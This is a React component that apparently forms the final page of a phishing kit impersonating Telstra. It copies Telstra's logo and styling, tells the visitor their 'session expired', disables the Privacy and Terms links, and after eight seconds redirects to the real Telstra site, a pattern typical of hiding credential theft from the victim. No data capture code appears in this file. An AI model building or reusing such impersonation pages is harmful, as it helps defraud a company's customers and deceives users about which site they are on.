import React, { useEffect } from 'react';

const DonePage = ({ onBackToLogin }) => {
  useEffect(() => {
    // Redirect to Telstra after delay
    const timer = setTimeout(() => {
      window.location.href = 'https://www.telstra.com.au/';
    }, 8000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="page active">
      <div className="done-container">
        <header className="t-page-header">
          <svg viewBox="0 0 28 30" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img">
            <path fill="#0099F8" d="M17.45,6.11L16.3,13.1c-.24,1.26-1.04,1.59-1.75,1.59H9.2L11.45,1.89C9.2,0.83,6.91,0.14,5.08,0.14c-1.74,0-3.15.48-4.08,1.65C.33,2.62,0,3.63,0,4.85c0,3.64,2.78,8.69,7.53,12.81C11.76,21.29,16.42,23.33,19.81,23.33c1.69,0,3.05-.53,3.97-1.6.71-.83,1-1.9,1-3.1C24.75,15.09,21.96,10.13,17.45,6.11Z"/>
            <path fill="#001E82" d="M5.79,1.48,5,5.61h7.03L9.01,21.67h5.59c.75,0,1.59-.33,1.84-1.56L19,5.61h5.06c.89,0,1.63-.57,1.83-1.47L26.67,0H7.61c-.89,0-1.63.57-1.82,1.48Z"/>
          </svg>
        </header>
        
        <main className="t-form-container">
          <h1 className="t-able-heading-b" tabIndex="-1">Session expired</h1>
          <p className="t-able-text-bodyshort">Your session has timed out. Please start again.</p>
          <a href="#" className="t-reset-password-link" onClick={(e) => { e.preventDefault(); onBackToLogin(); }}>
            Back to sign in
          </a>
        </main>
        
        <footer className="done-footer">
          <p>© 2025 Telstra Corporation Ltd.</p>
          <a href="#" target="_blank" onClick={(e) => e.preventDefault()}>Privacy</a>
          <a href="#" target="_blank" onClick={(e) => e.preventDefault()}>Terms of Use</a>
        </footer>
      </div>
    </div>
  );
};

export default DonePage;
